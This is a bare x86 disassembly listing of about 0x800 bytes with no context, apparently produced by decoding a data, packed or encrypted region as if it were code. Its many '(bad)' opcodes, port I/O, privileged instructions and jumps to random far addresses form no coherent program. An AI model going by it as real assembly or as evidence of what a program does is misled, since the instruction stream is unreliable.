  406a6a:	sbb    DWORD PTR [ebp-0x49aabca3],0xffffff8a
  406a71:	mov    ds:0x4eedc4eb,eax
  406a76:	mov    ds:0x7e7ec79d,al
  406a7b:	dec    edi
  406a7c:	jns    0x406afc
  406a7e:	jle    0x406aae
  406a80:	sahf   
  406a81:	add    eax,0xa579fc11
  406a86:	call   0x3288:0xd6cf28c6
  406a8d:	add    BYTE PTR [edx],al
  406a8f:	arpl   WORD PTR [ebx+0x5b],ax
  406a92:	and    DWORD PTR [esi-0x58024526],ebx
  406a98:	jl     0x406a7c
  406a9a:	test   cl,al
  406a9c:	out    dx,eax
  406a9d:	loopne 0x406a61
  406a9f:	test   eax,0xa80e0800
  406aa4:	mov    ch,0x1b
  406aa6:	les    esp,FWORD PTR [eax-0x11599ed2]
  406aac:	in     eax,dx
  406aad:	aas    
  406aae:	mov    ecx,ss
  406ab0:	jge    0x406a72
  406ab2:	push   0x6a
  406ab4:	ins    DWORD PTR es:[edi],dx
  406ab5:	and    BYTE PTR [ebx-0x9],dh
  406ab8:	or     DWORD PTR [edx-0x70],esi
  406abb:	mov    esp,0x7aeed44c
  406ac0:	fcmovbe st,st(3)
  406ac2:	jmp    0x83b1:0x7272d60a
  406ac9:	fwait
  406aca:	cld    
  406acb:	out    dx,eax
  406acc:	pushf  
  406acd:	jg     0x406b25
  406acf:	int    0x20
  406ad1:	cmp    bl,cl
  406ad3:	std    
  406ad4:	push   edx
  406ad5:	lock stos BYTE PTR es:[edi],al
  406ad7:	fimul  DWORD PTR [ecx-0x27196c33]
  406add:	pop    esi
  406ade:	xchg   edi,eax
  406adf:	int3   
  406ae0:	sbb    BYTE PTR [edi+0xa],bh
  406ae3:	dec    edi
  406ae4:	pop    eax
  406ae5:	sub    eax,0x5e525541
  406aea:	mov    ch,0x80
  406aec:	neg    DWORD PTR [eax-0x80]
  406aef:	jmp    0xe302b741
  406af4:	sub    ebx,edi
  406af6:	rcr    BYTE PTR [edx+0x1f38afda],0x9
  406afd:	mov    cl,0x45
  406aff:	and    al,0x1d
  406b01:	sbb    DWORD PTR [bp+di],ebx
  406b04:	adc    eax,DWORD PTR [edx-0x58]
  406b07:	or     BYTE PTR [edx-0x5],ch
  406b0a:	(bad)  
  406b0b:	repz jmp 0x66d6:0x57118015
  406b13:	fidivr WORD PTR [edx+0x40e75806]
  406b19:	addr16 mov di,0x2268
  406b1e:	(bad)  
  406b1f:	cld    
  406b20:	jp     0x406b97
  406b22:	add    BYTE PTR [ebx],dl
  406b24:	repz fs jb 0x406ac9
  406b28:	fisub  DWORD PTR [edx+ebp*8]
  406b2b:	pop    ebp
  406b2c:	loopne 0x406b4e
  406b2e:	mov    dl,0x71
  406b30:	in     al,0xc9
  406b32:	and    dh,0x49
  406b35:	jecxz  0x406adf
  406b37:	cmp    dl,BYTE PTR [edi]
  406b39:	arpl   WORD PTR [edi+0x67],dx
  406b3c:	jbe    0x406af2
  406b3e:	ins    BYTE PTR es:[edi],dx
  406b3f:	ja     0x406bc0
  406b41:	data16 das 
  406b43:	push   0x3e556f6e
  406b48:	and    esp,0xd0ac4519
  406b4e:	jmp    0x406b9c
  406b50:	test   BYTE PTR [ebp+0x69543d4f],dh
  406b56:	lahf   
  406b57:	fadd   DWORD PTR [esi+ebx*1-0x3c]
  406b5b:	sahf   
  406b5c:	xor    cl,BYTE PTR [ebx]
  406b5e:	push   ebp
  406b5f:	mov    eax,0xb2c56fce
  406b64:	xor    edx,DWORD PTR [eax+0x6a70a78c]
  406b6a:	out    dx,al
  406b6b:	scas   al,BYTE PTR es:[edi]
  406b6c:	adc    BYTE PTR [ecx+0x3e],ch
  406b6f:	pusha  
  406b70:	bound  eax,QWORD PTR [ebx+eiz*1+0x5]
  406b74:	xchg   esi,eax
  406b75:	into   
  406b76:	in     eax,0xe2
  406b78:	enter  0x4a60,0x5b
  406b7c:	pop    esi
  406b7d:	add    eax,0x4c2247ba
  406b82:	and    DWORD PTR [edx+0x19324566],esp
  406b88:	sub    al,0x68
  406b8a:	iret   
  406b8b:	sar    BYTE PTR [edi],cl
  406b8d:	pop    esp
  406b8e:	cwde   
  406b8f:	push   cs
  406b90:	pop    ds
  406b91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406b92:	jnp    0x406bed
  406b94:	push   ebx
  406b95:	sub    al,0x8b
  406b97:	xor    DWORD PTR [ebp+0x55],esp
  406b9a:	push   ss
  406b9b:	fimul  WORD PTR [ebp+0x6ef3dee]
  406ba1:	popf   
  406ba2:	daa    
  406ba3:	aas    
  406ba4:	xchg   ebp,eax
  406ba5:	push   ss
  406ba6:	dec    eax
  406ba7:	mov    esp,0x58142b13
  406bac:	fisttp WORD PTR [edx+0x2]
  406baf:	aad    0x1
  406bb1:	into   
  406bb2:	je     0x406b70
  406bb4:	jl     0x406bae
  406bb6:	push   ebx
  406bb7:	cwde   
  406bb8:	mov    cl,0xa1
  406bba:	ss mov dl,0xf2
  406bbd:	mov    ebx,0x626b2522
  406bc2:	xlat   BYTE PTR ds:[ebx]
  406bc3:	jp     0x406b77
  406bc5:	or     eax,0xfd335260
  406bca:	xchg   esi,eax
  406bcb:	mov    bh,0x40
  406bcd:	invd   
  406bcf:	jg     0x406b71
  406bd1:	outs   dx,BYTE PTR ds:[esi]
  406bd2:	xchg   esp,eax
  406bd3:	push   eax
  406bd4:	sar    BYTE PTR [ecx-0x4ca7b943],1
  406bda:	mov    BYTE PTR [esi+0x43],bl
  406bdd:	imul   edx,DWORD PTR [ebp-0x779054df],0xeac9bef6
  406be7:	outs   dx,BYTE PTR ds:[esi]
  406be8:	mov    DWORD PTR [edx-0x67910c8],edx
  406bee:	inc    ecx
  406bef:	add    dl,BYTE PTR [edi-0xc5d491]
  406bf5:	lsl    edi,WORD PTR [edx+eiz*1]
  406bf9:	xor    eax,0x6228b710
  406bfe:	les    edi,FWORD PTR [esi]
  406c00:	push   esp
  406c01:	popa   
  406c02:	xchg   esp,eax
  406c03:	push   esi
  406c04:	(bad)  
  406c05:	xor    cl,BYTE PTR [esi+0x6f18cf08]
  406c0b:	iret   
  406c0c:	in     eax,0x73
  406c0e:	xchg   ecx,eax
  406c0f:	in     al,dx
  406c10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c11:	aad    0xd3
  406c13:	retf   
  406c14:	je     0x406c7c
  406c16:	rcl    DWORD PTR [ebp-0x153f6b3d],0xfb
  406c1d:	ss popa 
  406c1f:	call   0x5adeba9f
  406c24:	xchg   ecx,eax
  406c25:	stos   DWORD PTR es:[edi],eax
  406c26:	dec    eax
  406c27:	mov    esp,0x34c7d06f
  406c2c:	cmp    al,0x52
  406c2e:	ret    
  406c2f:	mov    dh,BYTE PTR [ebx-0x1c]
  406c32:	shl    DWORD PTR [edi+eiz*2],0xa8
  406c36:	push   0x847c6be2
  406c3b:	inc    edi
  406c3c:	lods   eax,DWORD PTR ds:[esi]
  406c3d:	mov    eax,0x9ba8edd9
  406c42:	and    eax,0x5c2b902
  406c47:	int    0x10
  406c49:	inc    al
  406c4b:	test   DWORD PTR [edi+eax*4+0x45],esi
  406c4f:	imul   esi,DWORD PTR [ebx-0x6516b54f],0xc24029cf
  406c59:	ins    DWORD PTR es:[edi],dx
  406c5a:	test   eax,0xf83f8587
  406c5f:	pop    esi
  406c60:	outs   dx,BYTE PTR ds:[esi]
  406c61:	jl     0x406c52
  406c63:	clc    
  406c64:	loope  0x406cb3
  406c66:	js     0x406c4c
  406c68:	push   eax
  406c69:	loopne 0x406c05
  406c6b:	pop    eax
  406c6c:	cmp    edx,DWORD PTR [edi]
  406c6e:	add    edx,ecx
  406c70:	xor    bh,BYTE PTR [edx-0x107e3cec]
  406c76:	pop    edi
  406c77:	jg     0x406bfb
  406c79:	(bad)  
  406c7a:	cld    
  406c7b:	jbe    0x406c95
  406c7d:	sub    ecx,DWORD PTR [esi+0x20]
  406c80:	fstp   QWORD PTR [edi]
  406c82:	fstp   TBYTE PTR [esi-0x29806822]
  406c88:	lea    ebp,[edi+0x55]
  406c8b:	pop    ds
  406c8c:	in     al,dx
  406c8d:	xchg   ebx,eax
  406c8e:	jae    0x406c94
  406c90:	aaa    
  406c91:	and    eax,eax
  406c93:	stos   BYTE PTR es:[edi],al
  406c94:	and    al,0xde
  406c96:	adc    al,0xde
  406c98:	hlt    
  406c99:	or     al,BYTE PTR [edi-0x1b]
  406c9c:	add    edi,DWORD PTR [eax-0x115d4ea8]
  406ca2:	sub    edi,ebx
  406ca4:	stos   BYTE PTR es:[edi],al
  406ca5:	sub    DWORD PTR [edx],ecx
  406ca7:	mov    ecx,0xb836311d
  406cac:	mov    esp,edi
  406cae:	lock ins BYTE PTR es:[edi],dx
  406cb0:	cmp    eax,DWORD PTR [eax]
  406cb2:	mov    al,0xf
  406cb4:	in     al,0x58
  406cb6:	xchg   esi,eax
  406cb7:	and    bl,ch
  406cb9:	cli    
  406cba:	xlat   BYTE PTR ds:[ebx]
  406cbb:	or     bl,cl
  406cbd:	mov    ss,WORD PTR [edx+esi*8-0x2c2d6054]
  406cc4:	mov    eax,ds:0x23358b3c
  406cc9:	retf   0x89a5
  406ccc:	push   0xba76d9bf
  406cd1:	ins    DWORD PTR es:[edi],dx
  406cd2:	mov    eax,ds:0x3e939df2
  406cd7:	aas    
  406cd8:	fisubr DWORD PTR [esi+0x2a]
  406cdb:	pushf  
  406cdc:	popf   
  406cdd:	scas   eax,DWORD PTR es:[edi]
  406cde:	scas   al,BYTE PTR es:[edi]
  406cdf:	or     BYTE PTR [ebx-0x232160e0],al
  406ce5:	pop    ebp
  406ce6:	lahf   
  406ce7:	or     ebp,edi
  406ce9:	pop    ebp
  406cea:	imul   ebp,DWORD PTR [esi-0x71],0x2b
  406cee:	add    BYTE PTR [edx-0x23],bh
  406cf1:	or     ah,BYTE PTR [eax]
  406cf3:	sbb    ebp,DWORD PTR [ebx]
  406cf5:	fdivr  QWORD PTR [ecx+0x68ccde77]
  406cfb:	popf   
  406cfc:	sbb    al,BYTE PTR [ebp+0x60b3d2b9]
  406d02:	mov    dl,0xac
  406d04:	mov    ebp,0xfdbee729
  406d09:	xchg   edx,eax
  406d0a:	ret    
  406d0b:	xor    ecx,DWORD PTR [edi-0x43]
  406d0e:	mov    esp,0x44be4e72
  406d13:	or     esp,edx
  406d15:	and    al,0x63
  406d17:	dec    ecx
  406d18:	or     edi,DWORD PTR [ecx]
  406d1a:	out    dx,eax
  406d1b:	ret    
  406d1c:	jle    0x406d76
  406d1e:	jg     0x406cef
  406d20:	ins    DWORD PTR es:[edi],dx
  406d21:	mov    edi,0x6251089f
  406d26:	cmp    DWORD PTR [edx+0x19eed618],esi
  406d2c:	xchg   DWORD PTR [edx],edx
  406d2e:	out    dx,al
  406d2f:	sub    ch,dl
  406d31:	(bad)  
  406d33:	test   BYTE PTR [ecx],cl
  406d35:	jge    0x406d85
  406d37:	aad    0xac
  406d39:	fidivr DWORD PTR [esi+ebp*8]
  406d3c:	ss or  edi,edi
  406d3f:	retf   
  406d40:	cmp    al,BYTE PTR [edx+esi*2-0x6e0e6775]
  406d47:	in     al,0x3c
  406d49:	jle    0x406cd6
  406d4b:	lahf   
  406d4c:	int3   
  406d4d:	adc    al,0x73
  406d4f:	dec    esi
  406d50:	sbb    bl,BYTE PTR [eax-0x6cbe7cce]
  406d56:	dec    esi
  406d57:	jnp    0x406cee
  406d59:	pushf  
  406d5a:	pop    ebx
  406d5b:	sbb    edi,DWORD PTR [edi-0x2b6e5cf]
  406d61:	lock push ebx
  406d63:	pop    edi
  406d64:	pop    edi
  406d65:	push   esp
  406d66:	xor    al,0xd2
  406d68:	into   
  406d69:	pop    ecx
  406d6a:	mov    esi,DWORD PTR [esi+0x4ae3e236]
  406d70:	add    dh,BYTE PTR [edx+0x69]
  406d73:	mov    al,ds:0x9eb0d2ea
  406d78:	adc    BYTE PTR [edx],al
  406d7a:	out    dx,eax
  406d7b:	mov    ds:0xb328a1bb,al
  406d80:	mov    eax,ds:0x20efb45
  406d85:	sub    DWORD PTR [ecx-0x397fc1c7],edx
  406d8b:	adc    dl,dh
  406d8d:	cmp    eax,0x6c41bbcf
  406d92:	xor    ecx,ecx
  406d94:	rol    BYTE PTR [edi+0x3c],0xbf
  406d98:	push   ebx
  406d99:	in     al,dx
  406d9a:	jno    0x406df8
  406d9c:	and    ch,BYTE PTR [esi+0x74]
  406d9f:	imul   eax,DWORD PTR ds:0x5d03110e,0xdef72884
  406da9:	jl     0x406d8c
  406dab:	inc    ecx
  406dac:	in     al,0x4a
  406dae:	les    esi,FWORD PTR [eax]
  406db0:	sahf   
  406db1:	sub    BYTE PTR [eax-0x609cef52],0xe3
  406db8:	pop    edx
  406db9:	push   esi
  406dba:	and    cl,BYTE PTR [esi+0x648f9612]
  406dc0:	jb     0x406d7f
  406dc2:	pop    esp
  406dc3:	jg     0x406de1
  406dc5:	shr    eax,0x5d
  406dc8:	out    dx,al
  406dc9:	sub    al,0x7b
  406dcb:	div    BYTE PTR [eax]
  406dcd:	test   eax,0x3579d41
  406dd2:	(bad)  
  406dd3:	test   eax,0x304234
  406dd8:	fwait
  406dd9:	test   BYTE PTR [ebp+0x3],dh
  406ddc:	sub    BYTE PTR [edx+0x5c219c4b],ah
  406de2:	lods   eax,DWORD PTR ds:[esi]
  406de3:	lock add ebx,DWORD PTR [ebp-0x40]
  406de7:	nop
  406de8:	pop    ecx
  406de9:	xchg   edi,eax
  406dea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406deb:	aaa    
  406dec:	rcr    BYTE PTR ds:0x1a1b281,0x72
  406df3:	inc    DWORD PTR [edi]
  406df5:	and    eax,DWORD PTR [eax-0x4ee7dfc5]
  406dfb:	retf   
  406dfc:	out    dx,al
  406dfd:	cmp    BYTE PTR [eax+edx*2+0x23ca0aa9],dh
  406e04:	mov    ds:0xf176856b,eax
  406e09:	aaa    
  406e0a:	loop   0x406de9
  406e0c:	(bad)  
  406e0d:	icebp  
  406e0e:	or     ch,BYTE PTR [ebx-0x19c9b9ec]
  406e14:	mov    DWORD PTR [esi],ecx
  406e16:	frstor [esi+0xa6d25da]
  406e1c:	mov    edx,0x527e2608
  406e21:	xor    al,0xb5
  406e23:	xchg   ebx,eax
  406e24:	pop    edx
  406e25:	dec    eax
  406e26:	inc    ebx
  406e27:	jecxz  0x406e8b
  406e29:	mov    esi,0xc893ad3f
  406e2e:	and    DWORD PTR [ecx+0x30ec312a],edi
  406e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e35:	out    dx,al
  406e36:	mov    cl,0xa1
  406e38:	or     DWORD PTR [edx+0x6f],edi
  406e3b:	les    esp,FWORD PTR [eax+eax*2]
  406e3e:	test   DWORD PTR [eax-0x1ca8b5cb],0xce44ac57
  406e48:	jb     0x406e6b
  406e4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e4b:	inc    ebx
  406e4c:	retf   
  406e4d:	imul   esp,DWORD PTR [esi],0x4e
  406e50:	mov    edx,DWORD PTR [ebp-0x20]
  406e53:	mov    DWORD PTR ds:0x4345c7,0x7e00
  406e5d:	jmp    0x40724b
  406e62:	xchg   dl,dl
  406e64:	mov    bl,0x98
  406e66:	jae    0x406ec1
  406e68:	popf   
  406e69:	cld    
  406e6a:	ja     0x406e58
  406e6c:	or     dh,BYTE PTR [eax+0x745bac03]
  406e72:	out    dx,al
  406e73:	ret    
  406e74:	jle    0x406ef4
  406e76:	dec    edi
  406e77:	jns    0x406ef7
  406e79:	jle    0x406eea
  406e7b:	push   cs
  406e7c:	int    0x95
  406e7e:	fucomip st,st(6)
  406e80:	mov    dl,0xe2
  406e82:	dec    eax
  406e83:	sti    
  406e84:	sub    DWORD PTR ds:0x73a85d4d,edi
  406e8a:	aas    
  406e8b:	(bad)  
  406e8c:	je     0x406e3b
  406e8e:	das    
  406e8f:	xor    BYTE PTR [ebp-0x433127d0],0xd2
  406e96:	test   eax,0xa1ca8f41
  406e9b:	shr    BYTE PTR [esi-0x68],cl
  406e9e:	scas   al,BYTE PTR es:[edi]
  406e9f:	addr16 leave 
  406ea1:	(bad)  
  406ea2:	and    DWORD PTR [ebp-0x34],ecx
  406ea5:	ins    BYTE PTR es:[edi],dx
  406ea6:	je     0x406e7d
  406ea8:	sbb    al,BYTE PTR [esi-0x591dba78]
  406eae:	mov    ah,0x67
  406eb0:	push   esp
  406eb1:	add    BYTE PTR [edi+0x6b],0x86
  406eb5:	and    al,0x47
  406eb7:	lock das 
  406eb9:	jg     0x406eeb
  406ebb:	push   cs
  406ebc:	mov    edx,0x852e1114
  406ec1:	addr16 and al,0x34
  406ec4:	or     ah,ch
  406ec6:	sbb    eax,0x7f7d7a8a
  406ecb:	stos   DWORD PTR es:[edi],eax
  406ecc:	xchg   edi,eax
  406ecd:	mov    esp,0x23b60ae4
  406ed2:	pop    ss
  406ed3:	ret    0xad1b
  406ed6:	mov    ebp,0xec3c528e
  406edb:	cmp    eax,0xfad9bd45
  406ee0:	mov    eax,ds:0xb4db1cf
  406ee5:	add    ebx,eax
  406ee7:	mov    al,0x67
  406ee9:	inc    edi
  406eea:	sti    
  406eeb:	inc    edx
  406eec:	out    0x26,eax
  406eee:	aad    0x5b
  406ef0:	dec    edi
  406ef1:	test   DWORD PTR [esi],ebp
  406ef3:	fcomi  st,st(3)
  406ef5:	repnz mov ch,0xf9
  406ef8:	inc    ebx
  406ef9:	hlt    
  406efa:	in     eax,0x4b
  406efc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406efd:	pop    ss
  406efe:	ret    0x558b
  406f01:	mov    ebx,0xdb7b3037
  406f06:	jne    0x406ec2
  406f08:	call   0x8c3d:0x879014c9
  406f0f:	push   ss
  406f10:	xchg   edi,eax
  406f12:	jg     0x406f0a
  406f14:	jne    0x406f50
  406f16:	xor    ah,BYTE PTR [ebx+0x74]
  406f19:	pop    ebx
  406f1a:	fistp  QWORD PTR [esi+0x4f]
  406f1d:	outs   dx,BYTE PTR ds:[esi]
  406f1e:	mov    esp,0xc6f895f3
  406f23:	xlat   BYTE PTR ds:[ebx]
  406f24:	(bad)  
  406f25:	mov    edx,esi
  406f27:	shrd   ebp,ebp,cl
  406f2a:	pop    eax
  406f2b:	shr    DWORD PTR [ebx-0x7f5a34ca],1
  406f31:	mov    es,WORD PTR [eax+0x7705cfa9]
  406f37:	scas   eax,DWORD PTR es:[edi]
  406f38:	bound  ebp,QWORD PTR [ebp+ecx*4-0x7d]
  406f3c:	add    dh,BYTE PTR [edi]
  406f3e:	jbe    0x406f23
  406f40:	shl    BYTE PTR [ebx],1
  406f42:	mov    al,0x36
  406f44:	cmp    DWORD PTR [ebx+edi*8],0xffffffab
  406f48:	cs pop edi
  406f4a:	aas    
  406f4b:	je     0x406f5f
  406f4d:	iret   
  406f4e:	pop    es
  406f4f:	adc    eax,0x7e4b9ed7
  406f54:	xor    al,0xc0
  406f56:	inc    edi
  406f57:	jmp    0x3d449c6e
  406f5c:	leave  
  406f5d:	pop    ebx
  406f5e:	jmp    0x7a32:0x71a1b8f6
  406f65:	mov    eax,ds:0x79b7bd8b
  406f6a:	jge    0x406fb5
  406f6c:	(bad)  
  406f6d:	push   cs
  406f6e:	rol    BYTE PTR [edx+0x2bd68c3e],cl
  406f74:	inc    edi
  406f75:	mov    bl,0x43
  406f77:	pop    esp
  406f78:	push   edx
  406f79:	nop
  406f7a:	inc    eax
  406f7b:	pop    edx
  406f7c:	enter  0x8010,0xa4
  406f80:	sbb    dl,BYTE PTR [edx-0x1994c150]
  406f86:	shl    DWORD PTR [edi-0x754db583],cl
  406f8c:	cmp    al,0xc9
  406f8e:	cmp    dh,BYTE PTR [esi+0x3cdbcad1]
  406f94:	sub    BYTE PTR [eax],ah
  406f96:	xlat   BYTE PTR ds:[ebx]
  406f97:	test   BYTE PTR [ebx-0x60d60e1b],ch
  406f9d:	or     ah,BYTE PTR [edx+eax*8+0xd]
  406fa1:	sbb    esp,edi
  406fa3:	mov    eax,ds:0x75d47ab4
  406fa8:	ds jae 0x406f46
  406fab:	or     cl,BYTE PTR [ebx]
  406fad:	jmp    0x406f5e
  406faf:	test   eax,0x5d2fe002
  406fb4:	sbb    BYTE PTR [esp+ebx*1],bh
  406fb7:	jns    0x406faf
  406fb9:	sahf   
  406fba:	popf   
  406fbb:	inc    esp
  406fbc:	out    0x1d,eax
  406fbe:	add    BYTE PTR [esi-0x751a03b4],0x7
  406fc5:	ins    DWORD PTR es:[edi],dx
  406fc6:	sub    eax,0xf94f69bc
  406fcb:	stos   BYTE PTR es:[edi],al
  406fcc:	inc    ebx
  406fcd:	call   FWORD PTR [esi-0x52]
  406fd0:	push   edx
  406fd1:	stos   BYTE PTR es:[edi],al
  406fd2:	mov    edx,0xcfeda36e
  406fd7:	jg     0x406f9f
  406fd9:	inc    edx
  406fda:	rcl    ecx,1
  406fdc:	jp     0x406f7b
  406fde:	cmp    bh,bl
  406fe0:	mov    eax,0xf51df6c
  406fe5:	test   DWORD PTR [eax-0x3f],edx
  406fe8:	addr16 test al,0x55
  406feb:	lds    eax,FWORD PTR [ebp+edi*1-0x70]
  406fef:	dec    edx
  406ff0:	or     esp,DWORD PTR [ecx-0x1d]
  406ff3:	mov    edx,0xde7b5afd
  406ff8:	retf   
  406ff9:	or     eax,0x7001dc40
  406ffe:	in     eax,0x75
  407000:	sbb    al,0x62
  407002:	cmp    esi,DWORD PTR [eax+ebp*4-0x74]
  407006:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407007:	and    DWORD PTR [edx+0x11],0xffffffb3
  40700b:	pop    edi
  40700c:	mov    cl,0xcb
  40700e:	xchg   bx,ax
  407010:	mov    edx,0xe1c10085
  407015:	lods   al,BYTE PTR ds:[esi]
  407016:	xchg   ebx,eax
  407017:	xchg   BYTE PTR [ebx+0x34],cl
  40701a:	add    bl,BYTE PTR [ebp+0x6e254720]
  407020:	xchg   DWORD PTR [edi-0x101f5ef4],ecx
  407026:	mov    cl,0xe0
  407028:	jns    0x407095
  40702a:	dec    eax
  40702b:	mov    bl,BYTE PTR [edx-0x14]
  40702e:	gs mov edi,0x490137f1
  407034:	xchg   edi,eax
  407035:	div    esi
  407037:	outs   dx,BYTE PTR ds:[esi]
  407038:	jecxz  0x406fc1
  40703a:	pop    ebp
  40703b:	or     dl,ah
  40703d:	loopne 0x407091
  40703f:	mov    eax,ds:0x1e98ccb0
  407044:	call   0xb40b:0xa0d52f55
  40704b:	call   0xc064e416
  407050:	mov    esp,0x25aed904
  407055:	xchg   ebp,eax
  407056:	lahf   
  407057:	rcl    DWORD PTR [edx+ecx*2],0xcd
  40705b:	cmp    BYTE PTR [edi-0x43754f73],cl
  407061:	or     BYTE PTR [edx],bl
  407063:	jbe    0x407042
  407065:	outs   dx,BYTE PTR ds:[esi]
  407066:	fs pop edi
  407068:	and    cl,0x5b
  40706b:	popa   
  40706c:	(bad)
  407070:	push   ecx
  407071:	loop   0x407058
  407073:	mov    edi,0xe246ce30
  407078:	xchg   esi,eax
  407079:	rcl    BYTE PTR [ebp-0x677d3e03],1
  40707f:	or     DWORD PTR [ecx-0x6a],ebx
  407082:	ins    DWORD PTR es:[edi],dx
  407083:	ret    
  407084:	mov    esi,0x6ec17a20
  407089:	sub    DWORD PTR [edi-0x2ee7244],eax
  40708f:	pop    esi
  407090:	imul   BYTE PTR [esi-0x1b2e55a4]
  407096:	gs sbb eax,0x6c79fb37
  40709c:	jne    0x4070c0
  40709e:	push   eax
  40709f:	xor    al,BYTE PTR [ebx+0x7eca03c8]
  4070a5:	ja     0x407106
  4070a7:	mov    ebx,0xe8818bc6
  4070ac:	xchg   BYTE PTR ds:0xce430442,cl
  4070b2:	adc    dh,al
  4070b4:	retf   0x29e9
  4070b7:	mov    dl,0xe0
  4070b9:	and    edi,eax
  4070bb:	outs   dx,BYTE PTR ds:[esi]
  4070bc:	ss out dx,al
  4070be:	mov    al,0xf4
  4070c0:	jnp    0x407095
  4070c2:	inc    esp
  4070c3:	ins    BYTE PTR es:[edi],dx
  4070c4:	ret    
  4070c5:	add    DWORD PTR [edx+0x2d],0xd17378c
  4070cc:	jl     0x4070e0
  4070ce:	push   edi
  4070cf:	push   edi
  4070d0:	pop    edi
  4070d1:	fbld   TBYTE PTR [esi+0x36]
  4070d4:	mov    esp,DWORD PTR [ecx+0x3c]
  4070d7:	bndldx bnd1,ds:0x4b569f5c
  4070de:	ins    DWORD PTR es:[edi],dx
  4070df:	add    BYTE PTR [eax+0x7536f4ec],ah
  4070e5:	sub    DWORD PTR [ebp-0x72eb8d18],edi
  4070eb:	mov    ss,WORD PTR [ebx-0x70deee54]
  4070f1:	pop    edx
  4070f2:	xor    eax,edi
  4070f4:	cld    
  4070f5:	and    eax,0x745c439a
  4070fa:	das    
  4070fb:	push   es
  4070fc:	fstp   TBYTE PTR [ecx]
  4070fe:	dec    ebx
  4070ff:	mov    al,0xd5
  407101:	lds    ebp,FWORD PTR [ebx]
  407103:	push   cs
  407104:	bound  ebx,QWORD PTR [ebp-0x44]
  407107:	nop
  407108:	or     DWORD PTR [ebx+0x52],eax
  40710b:	push   DWORD PTR [esi+0x49]
  40710e:	xor    DWORD PTR gs:[edx],ebp
  407111:	add    BYTE PTR [esi+0x1759f16d],cl
  407117:	iret   
  407118:	test   DWORD PTR [ecx-0x67],edi
  40711b:	xlat   BYTE PTR ds:[ebx]
  40711c:	ret    0xafd6
  40711f:	mov    esi,0x8d7cfbb6
  407124:	shl    BYTE PTR [ebx+0x2a],1
  407127:	jbe    0x407102
  407129:	ret    0xd69c
  40712c:	out    dx,eax
  40712d:	in     al,0xa7
  40712f:	mov    ebp,0xbeaeed32
  407134:	mov    ah,0x41
  407136:	daa    
  407137:	push   esp
  407138:	xchg   ebx,eax
  407139:	xor    DWORD PTR [ebx-0x59374c33],0xfed67c42
  407143:	pop    ds
  407144:	push   ds
  407145:	mov    ds:0x67a3ff86,al
  40714a:	pusha  
  40714b:	mov    ds:0xfaa24c8f,eax
  407150:	or     eax,0xf853fd83
  407155:	lods   al,BYTE PTR ds:[esi]
  407156:	nop
  407157:	stos   DWORD PTR es:[edi],eax
  407158:	dec    esi
  407159:	sub    ecx,eax
  40715b:	and    DWORD PTR [esi-0x6],ebp
  40715e:	sbb    dl,al
  407160:	mov    bl,0xa2
  407162:	and    al,0x4a
  407164:	leave  
  407165:	lock mov eax,DWORD PTR [eax-0x77e45a96]
  40716c:	jecxz  0x4070fa
  40716e:	hlt    
  40716f:	(bad)  
  407171:	push   edx
  407172:	mov    bl,BYTE PTR [ebx]
  407174:	adc    DWORD PTR [edx],eax
  407176:	sbb    ecx,ecx
  407178:	(bad)  
  407179:	fdivr  DWORD PTR [edi]
  40717b:	sbb    bh,BYTE PTR [ebx+0x258407fd]
  407181:	inc    edx
  407182:	jne    0x4071f2
  407184:	adc    BYTE PTR [ebx+0x27],bl
  407187:	mov    ds:0x9fef1b66,eax
  40718c:	jg     0x40719e
  40718e:	cli    
  40718f:	dec    eax
  407190:	jnp    0x4071dd
  407192:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407193:	imul   BYTE PTR ds:0x8fa544c1
  407199:	pop    ds
  40719a:	xor    al,0x5b
  40719c:	test   DWORD PTR [bp+di+0x1dbd],esi
  4071a1:	mov    WORD PTR [eax-0x30],ss
  4071a4:	cmp    BYTE PTR [ebx+0x7a],ah
  4071a7:	jp     0x4071af
  4071a9:	add    eax,0x30e3840c
  4071ae:	lods   eax,DWORD PTR ds:[esi]
  4071af:	sbb    al,0x2c
  4071b1:	and    DWORD PTR [esi-0x5e],0xc8f3293
  4071b8:	cli    
  4071b9:	fsubr  DWORD PTR [edx]
  4071bb:	ins    DWORD PTR es:[edi],dx
  4071bc:	sub    BYTE PTR [eax+0x2d7553ad],0x10
  4071c3:	sub    esp,DWORD PTR [ebx]
  4071c5:	add    DWORD PTR [ecx],edi
  4071c7:	das    
  4071c8:	sti    
  4071c9:	xchg   edi,eax
  4071ca:	adc    DWORD PTR [eax],ebp
  4071cc:	cs pop ebx
  4071ce:	dec    ecx
  4071cf:	adc    BYTE PTR [edi+0x3877862c],dh
  4071d5:	xor    dh,BYTE PTR [edi-0x76058745]
  4071db:	scas   eax,DWORD PTR es:[edi]
  4071dc:	dec    edi
  4071dd:	out    0x74,al
  4071df:	xlat   BYTE PTR ds:[ebx]
  4071e0:	dec    ebp
  4071e1:	mov    dl,BYTE PTR [eiz*2-0x5b97c674]
  4071e8:	lahf   
  4071e9:	in     eax,0x5b
  4071eb:	mov    ebx,0x31a879c5
  4071f0:	fs int 0xef
  4071f3:	xor    DWORD PTR [ecx-0x67],0xffffffc9
  4071f7:	fnstenv [ebp-0x211937f7]
  4071fd:	in     eax,0xff
  4071ff:	or     eax,0x18
  407202:	pop    edx
  407203:	xchg   ecx,eax
  407204:	je     0x40724e
  407206:	jns    0x4071fa
  407208:	test   al,0xe0
  40720a:	enter  0x46d0,0x3a
  40720e:	les    esp,FWORD PTR [edx+0x56653e3f]
  407214:	jns    0x407270
  407216:	xchg   esp,eax
  407217:	inc    edx
  407218:	xchg   ebp,eax
  407219:	xchg   bl,ch
  40721b:	loop   0x4071ed
  40721d:	xchg   ebp,eax
  40721e:	xchg   ebx,eax
  40721f:	lea    esp,[eax-0x49]
  407222:	dec    ebx
  407223:	(bad)  
  407224:	sbb    edx,DWORD PTR [edi]
  407226:	inc    ecx
  407227:	pop    ebx
  407228:	xor    cl,ch
  40722a:	jmp    0x4071d4
  40722c:	push   ds
  40722d:	push   0x1726c68
  407232:	cmp    eax,0x479b7d3c
  407237:	enter  0xc7f8,0x78
  40723b:	mov    edx,0x290810f
  407240:	pop    ebp
